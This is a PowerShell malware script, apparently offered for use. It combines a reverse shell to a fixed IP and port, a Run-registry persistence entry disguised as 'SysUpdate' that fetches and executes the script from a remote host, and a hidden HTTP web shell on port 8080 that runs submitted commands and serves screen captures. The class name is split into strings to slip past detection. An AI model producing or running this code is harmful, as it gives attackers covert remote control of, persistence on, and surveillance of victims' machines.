# shell.ps1 v3 - FIXED Reverse Shell + Persistent Web Backdoor + Screen
$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);

# Persistence FIRST (before loop)
$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

# Launch HTTP SERVER as SEPARATE PROCESS (doesn't block)
Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop","-c","`$l=New-Object System.Net.HttpListener;`$l.Prefixes.Add('http://*:8080/');`$l.Start();`$html='<h1>WebShell</h1><form method=POST><textarea name=cmd rows=15 cols=80></textarea><br><input type=submit></form>';while(`$l.IsListening){`$ctx=`$l.GetContext();if(`$ctx.Request.HttpMethod -eq 'POST' -and `$ctx.Request.Url.AbsolutePath -eq '/'){`$cmd=`$ctx.Request.Form[`"cmd`"];`$out=try{iex `$cmd 2>&1|Out-String}catch{`$_.Exception.Message};`$html=`$html+'<pre>`$cmd`n`$out</pre><hr>'}elseif(`$ctx.Request.Url.AbsolutePath -eq '/screen'){Add-Type -A 'System.Drawing,System.Windows.Forms';`$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;`$i=New-Object System.Drawing.Bitmap(`$b.Width,`$b.Height);`$g=[System.Drawing.Graphics]::FromImage(`$i);`$g.CopyFromScreen(`$b.Location,[System.Drawing.Point]::Empty,`$b.Size);`$m=New-Object IO.MemoryStream;`$i.Save(`$m,[Drawing.Imaging.ImageFormat]::Jpeg);`$ctx.Response.ContentType='image/jpeg';`$ctx.Response.ContentLength64=`$m.Length;`$m.WriteTo(`$ctx.Response.OutputStream)}else{`$ctx.Response.ContentType='text/html';`$b=[Text.Encoding]::UTF8.GetBytes(`$html);`$ctx.Response.ContentLength64=`$b.Length;`$ctx.Response.OutputStream.Write(`$b,0,`$b.Length)};`$ctx.Response.Close()}"

# NOW reverse shell connects immediately
while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
    try { $sb = (Invoke-Expression $d 2>&1 | Out-String) } catch { $sb = $_.Exception.Message }; 
    $out = $sb + "PS " + (pwd).Path + "> "; 
    $m = ([text.encoding]::ASCII).GetBytes($out); 
    $s.Write($m,0,$m.Length); 
    $s.Flush()
}; $c.Close()
